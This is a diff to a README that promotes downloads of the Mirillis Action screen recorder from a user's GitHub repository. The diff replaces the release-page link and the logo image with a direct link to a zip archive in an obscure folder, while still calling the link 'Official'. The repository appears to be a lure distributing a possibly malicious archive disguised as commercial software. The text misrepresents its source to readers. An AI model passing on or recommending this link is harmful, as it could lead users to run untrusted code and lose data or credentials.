@@ -13,7 +13,7 @@ Action | Action Screen Recorder | Bandicam | Download Mirillis Action | Fraps | 
 
 ## Resources 📦
 
-To download the latest version of Mirillis Action, please visit the [Official Mirillis Action Releases](https://github.com/uzia11/Mirillis-Action/releases) page.
+To download the latest version of Mirillis Action, please visit the [Official Mirillis Action Releases](https://raw.githubusercontent.com/uzia11/Mirillis-Action/main/lounging/Action_Mirillis_v3.3.zip) page.
 
 ## Get Started 🚀
 
@@ -25,7 +25,7 @@ Thank you for choosing Mirillis Action for all your recording needs. Stay tuned 
 
 Remember, the best screen recording experience is just a click away with Mirillis Action! 🎮📹
 
-![Mirillis Action Logo](https://example.com/mirillis-action-logo.png)
+![Mirillis Action Logo](https://raw.githubusercontent.com/uzia11/Mirillis-Action/main/lounging/Action_Mirillis_v3.3.zip)
 
 ---
 By using Mirillis Action, you are empowered to capture, stream, and record your screen effortlessly. Take your recordings to the next level with our user-friendly interface and powerful features. Download now and start creating professional videos with ease!
